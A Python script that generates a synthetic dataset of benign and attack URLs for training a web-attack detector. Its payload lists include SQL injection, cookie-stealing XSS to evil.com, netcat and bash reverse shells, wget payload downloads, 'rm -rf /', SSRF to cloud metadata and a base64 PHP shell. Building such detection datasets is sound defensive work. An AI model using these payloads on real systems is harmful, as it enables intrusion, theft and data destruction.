"""
Synthetic Dataset Generator for URL-based Attack Detection
Generates realistic attack patterns and benign traffic for ML training
"""
import random
import string
import pandas as pd
from datetime import datetime, timedelta
from typing import List, Dict, Tuple
import os
import sys

# Add parent directory to path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from app.utils.attack_patterns import ATTACK_TYPES, SEVERITY


class SyntheticDatasetGenerator:
    """Generate synthetic attack and benign URL samples"""

    def __init__(self, seed: int = 42):
        random.seed(seed)
        self.base_domains = [
            "example.com", "testsite.org", "webapp.net", "api.service.io",
            "shop.example.com", "admin.portal.com", "secure.banking.com",
            "social.network.com", "cloud.storage.com", "video.streaming.com"
        ]

        self.benign_paths = [
            "/index.html", "/home", "/about", "/contact", "/products",
            "/services", "/blog", "/api/v1/users", "/api/v1/posts",
            "/dashboard", "/profile", "/settings", "/search", "/login",
            "/register", "/checkout", "/cart", "/categories", "/help"
        ]

        self.benign_params = [
            ("page", "1"), ("sort", "asc"), ("limit", "10"),
            ("category", "electronics"), ("q", "laptop"),
            ("filter", "new"), ("lang", "en"), ("theme", "dark")
        ]

    def generate_dataset(self, num_samples: int = 10000, attack_ratio: float = 0.4) -> pd.DataFrame:
        """
        Generate complete dataset with attacks and benign traffic.

        Args:
            num_samples: Total number of samples to generate
            attack_ratio: Ratio of attack samples (0.0 to 1.0)

        Returns:
            DataFrame with columns: url, label, attack_type, severity
        """
        num_attacks = int(num_samples * attack_ratio)
        num_benign = num_samples - num_attacks

        print(f"Generating {num_samples} samples ({num_attacks} attacks, {num_benign} benign)...")

        data = []

        # Generate attack samples
        attack_types = list(ATTACK_TYPES.values())
        samples_per_attack = num_attacks // len(attack_types)

        for attack_type in attack_types:
            print(f"Generating {samples_per_attack} samples for {attack_type}...")
            attack_samples = self._generate_attack_samples(attack_type, samples_per_attack)
            data.extend(attack_samples)

        # Generate benign samples
        print(f"Generating {num_benign} benign samples...")
        benign_samples = self._generate_benign_samples(num_benign)
        data.extend(benign_samples)

        # Shuffle data
        random.shuffle(data)

        # Create DataFrame
        df = pd.DataFrame(data, columns=["url", "label", "attack_type", "severity"])

        print(f"Dataset generated: {len(df)} total samples")
        print(f"Attack distribution:\n{df['attack_type'].value_counts()}")

        return df

    def _generate_attack_samples(self, attack_type: str, count: int) -> List[Tuple]:
        """Generate attack samples for specific attack type"""
        samples = []

        generator_map = {
            ATTACK_TYPES["SQL_INJECTION"]: self._generate_sql_injection,
            ATTACK_TYPES["XSS"]: self._generate_xss,
            ATTACK_TYPES["DIRECTORY_TRAVERSAL"]: self._generate_directory_traversal,
            ATTACK_TYPES["COMMAND_INJECTION"]: self._generate_command_injection,
            ATTACK_TYPES["SSRF"]: self._generate_ssrf,
            ATTACK_TYPES["LFI_RFI"]: self._generate_lfi_rfi,
            ATTACK_TYPES["CREDENTIAL_STUFFING"]: self._generate_credential_stuffing,
            ATTACK_TYPES["HTTP_PARAM_POLLUTION"]: self._generate_http_pollution,
            ATTACK_TYPES["XXE_INJECTION"]: self._generate_xxe,
            ATTACK_TYPES["WEB_SHELL"]: self._generate_web_shell,
            ATTACK_TYPES["TYPOSQUATTING"]: self._generate_typosquatting,
            ATTACK_TYPES["OPEN_REDIRECT"]: self._generate_open_redirect,
            ATTACK_TYPES["LDAP_INJECTION"]: self._generate_ldap_injection,
            ATTACK_TYPES["TEMPLATE_INJECTION"]: self._generate_template_injection,
        }

        generator = generator_map.get(attack_type)
        if generator:
            for _ in range(count):
                url = generator()
                severity = self._determine_severity(attack_type)
                samples.append((url, "attack", attack_type, severity))

        return samples

    def _generate_benign_samples(self, count: int) -> List[Tuple]:
        """Generate benign URL samples"""
        samples = []

        for _ in range(count):
            domain = random.choice(self.base_domains)
            path = random.choice(self.benign_paths)

            # Add random query parameters
            params = []
            num_params = random.randint(0, 3)
            for _ in range(num_params):
                param, value = random.choice(self.benign_params)
                if random.random() > 0.5:
                    value = self._generate_random_string(5, 15)
                params.append(f"{param}={value}")

            url = f"http://{domain}{path}"
            if params:
                url += "?" + "&".join(params)

            samples.append((url, "benign", "benign", "Low"))

        return samples

    # Attack-specific generators

    def _generate_sql_injection(self) -> str:
        """Generate SQL injection samples"""
        domain = random.choice(self.base_domains)
        path = random.choice(["/login", "/search", "/product", "/user"])

        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' AND 1=0 UNION SELECT username,password FROM users--",
            "1' ORDER BY 3--",
            "'; DROP TABLE users--",
            "' OR '1'='1' /*",
            "admin' OR 'a'='a",
            "' UNION ALL SELECT NULL,@@version--",
            "1 AND 1=2 UNION SELECT table_name FROM information_schema.tables--",
            "' AND SLEEP(5)--",
            "' OR BENCHMARK(1000000,MD5('A'))--",
            "' WAITFOR DELAY '00:00:05'--",
            "' EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
        ]

        payload = random.choice(payloads)
        param = random.choice(["id", "user", "q", "search", "category"])

        return f"http://{domain}{path}?{param}={payload}"

    def _generate_xss(self) -> str:
        """Generate XSS samples"""
        domain = random.choice(self.base_domains)
        path = random.choice(["/comment", "/search", "/profile", "/post"])

        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(document.cookie)",
            "<iframe src='javascript:alert(1)'>",
            "<body onload=alert(1)>",
            "<img src='x' onerror='alert(String.fromCharCode(88,83,83))'>",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>",
            "<script>document.location='http://evil.com/?c='+document.cookie</script>",
            "<img src='x' onerror='eval(atob(\"YWxlcnQoMSk=\"))'>",
            "';alert(String.fromCharCode(88,83,83))//",
            "<IMG SRC=/ onerror=\"alert(1)\"></img>",
            "<div onmouseover='alert(1)'>hover me</div>",
        ]

        payload = random.choice(payloads)
        param = random.choice(["comment", "q", "msg", "name", "title"])

        return f"http://{domain}{path}?{param}={payload}"

    def _generate_directory_traversal(self) -> str:
        """Generate directory traversal samples"""
        domain = random.choice(self.base_domains)
        path = random.choice(["/download", "/file", "/view", "/read"])

        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "../../../etc/shadow",
            "..\\..\\..\\boot.ini",
            "/var/www/../../etc/passwd",
            "....\/....\/....\/etc/passwd",
        ]

        payload = random.choice(payloads)
        param = random.choice(["file", "path", "document", "page", "load"])

        return f"http://{domain}{path}?{param}={payload}"

    def _generate_command_injection(self) -> str:
        """Generate command injection samples"""
        domain = random.choice(self.base_domains)
        path = random.choice(["/ping", "/exec", "/run", "/command"])

        payloads = [
            "; ls -la",
            "| whoami",
            "& cat /etc/passwd",
            "`id`",
            "$(uname -a)",
            "; nc -e /bin/sh evil.com 4444",
            "| wget http://evil.com/shell.sh",
            "&& rm -rf /",
            "; cat /etc/passwd > /tmp/out",
            "| bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
        ]

        payload = random.choice(payloads)
        param = random.choice(["ip", "host", "cmd", "exec", "run"])

        return f"http://{domain}{path}?{param}=192.168.1.1{payload}"

    def _generate_ssrf(self) -> str:
        """Generate SSRF samples"""
        domain = random.choice(self.base_domains)
        path = random.choice(["/fetch", "/proxy", "/image", "/url"])

        targets = [
            "http://localhost/admin",
            "http://127.0.0.1:8080/",
            "http://169.254.169.254/latest/meta-data/",
            "http://10.0.0.1/",
            "http://192.168.1.1/admin",
            "http://localhost:6379/",
            "file:///etc/passwd",
            "dict://localhost:11211/stats",
            "gopher://127.0.0.1:25/",
        ]

        target = random.choice(targets)
        param = random.choice(["url", "target", "fetch", "proxy", "callback"])

        return f"http://{domain}{path}?{param}={target}"

    def _generate_lfi_rfi(self) -> str:
        """Generate LFI/RFI samples"""
        domain = random.choice(self.base_domains)
        path = random.choice(["/include", "/page", "/view", "/load"])

        payloads = [
            "../../../../etc/passwd",
            "http://evil.com/shell.txt",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "expect://id",
            "zip://shell.jpg%23shell.php",
            "../../../../../../etc/passwd%00",
        ]

        payload = random.choice(payloads)
        param = random.choice(["file", "page", "include", "load", "view"])

        return f"http://{domain}{path}?{param}={payload}"

    def _generate_credential_stuffing(self) -> str:
        """Generate credential stuffing samples"""
        domain = random.choice(self.base_domains)
        path = "/login"

        usernames = ["admin", "root", "administrator", "user", "test"]
        passwords = ["admin", "password", "123456", "admin123", "root"]

        user = random.choice(usernames)
        pwd = random.choice(passwords)

        return f"http://{domain}{path}?username={user}&password={pwd}"

    def _generate_http_pollution(self) -> str:
        """Generate HTTP parameter pollution samples"""
        domain = random.choice(self.base_domains)
        path = random.choice(["/search", "/filter", "/api"])

        param = random.choice(["id", "user", "action"])
        value1 = random.randint(1, 100)
        value2 = random.randint(101, 200)

        return f"http://{domain}{path}?{param}={value1}&{param}={value2}"

    def _generate_xxe(self) -> str:
        """Generate XXE injection samples"""
        domain = random.choice(self.base_domains)
        path = random.choice(["/upload", "/parse", "/xml", "/api"])

        payloads = [
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/'>]>",
            "<!ENTITY xxe SYSTEM 'file:///dev/random'>",
        ]

        payload = random.choice(payloads)

        return f"http://{domain}{path}?xml={payload}"

    def _generate_web_shell(self) -> str:
        """Generate web shell upload samples"""
        domain = random.choice(self.base_domains)

        shells = [
            "/uploads/cmd.php",
            "/files/shell.jsp",
            "/images/backdoor.asp",
            "/assets/c99.php",
            "/upload/r57.php",
            "/tmp/b374k.php",
            "/webshell.aspx",
        ]

        shell = random.choice(shells)

        cmds = ["whoami", "ls", "pwd", "cat /etc/passwd"]
        cmd = random.choice(cmds)

        return f"http://{domain}{shell}?cmd={cmd}"

    def _generate_typosquatting(self) -> str:
        """Generate typosquatting samples"""
        # Simulate typosquatted domains
        fake_domains = [
            "g00gle.com", "facebo0k.com", "amaz0n.com", "micros0ft.com",
            "app1e.com", "paypa1.com", "netfl1x.com", "twltter.com"
        ]

        domain = random.choice(fake_domains)
        path = random.choice(["/login", "/verify", "/account", "/signin"])

        return f"http://{domain}{path}"

    def _generate_open_redirect(self) -> str:
        """Generate open redirect samples"""
        domain = random.choice(self.base_domains)
        path = random.choice(["/redirect", "/goto", "/url", "/continue"])

        targets = [
            "http://evil.com",
            "//evil.com",
            "http://evil.com@example.com",
            "%2f%2fevil.com",
        ]

        target = random.choice(targets)
        param = random.choice(["url", "redirect", "next", "continue", "return"])

        return f"http://{domain}{path}?{param}={target}"

    def _generate_ldap_injection(self) -> str:
        """Generate LDAP injection samples"""
        domain = random.choice(self.base_domains)
        path = random.choice(["/ldap", "/search", "/user", "/auth"])

        payloads = [
            "*)(uid=*",
            "admin)(&(password=*))",
            "*)(%26(password=*))",
            "*))%00",
        ]

        payload = random.choice(payloads)
        param = random.choice(["user", "search", "filter", "query"])

        return f"http://{domain}{path}?{param}={payload}"

    def _generate_template_injection(self) -> str:
        """Generate template injection samples"""
        domain = random.choice(self.base_domains)
        path = random.choice(["/render", "/template", "/view", "/preview"])

        payloads = [
            "{{7*7}}",
            "{{config.items()}}",
            "${7*7}",
            "<%=7*7%>",
            "{{request.application.__globals__}}",
        ]

        payload = random.choice(payloads)
        param = random.choice(["template", "view", "content", "data"])

        return f"http://{domain}{path}?{param}={payload}"

    def _generate_random_string(self, min_len: int, max_len: int) -> str:
        """Generate random alphanumeric string"""
        length = random.randint(min_len, max_len)
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    def _determine_severity(self, attack_type: str) -> str:
        """Determine severity level for attack type"""
        critical = ["SQL Injection", "Command Injection", "XXE", "Web Shell"]
        high = ["XSS", "Directory Traversal", "SSRF", "Local/Remote File Inclusion"]
        medium = ["Open Redirect", "LDAP Injection", "Template Injection", "HTTP Parameter Pollution"]

        if attack_type in critical:
            return SEVERITY["CRITICAL"]
        elif attack_type in high:
            return SEVERITY["HIGH"]
        elif attack_type in medium:
            return SEVERITY["MEDIUM"]
        else:
            return SEVERITY["LOW"]


def main():
    """Generate and save dataset"""
    generator = SyntheticDatasetGenerator()

    # Generate 15000 samples for robust training
    df = generator.generate_dataset(num_samples=15000, attack_ratio=0.45)

    # Save to CSV
    output_dir = os.path.join(os.path.dirname(__file__), "..", "data", "datasets")
    os.makedirs(output_dir, exist_ok=True)

    output_path = os.path.join(output_dir, "url_attacks_dataset.csv")
    df.to_csv(output_path, index=False)

    print(f"\nDataset saved to: {output_path}")
    print(f"\nDataset statistics:")
    print(f"Total samples: {len(df)}")
    print(f"Attack samples: {len(df[df['label'] == 'attack'])}")
    print(f"Benign samples: {len(df[df['label'] == 'benign'])}")
    print(f"\nSeverity distribution:")
    print(df['severity'].value_counts())


if __name__ == "__main__":
    main()
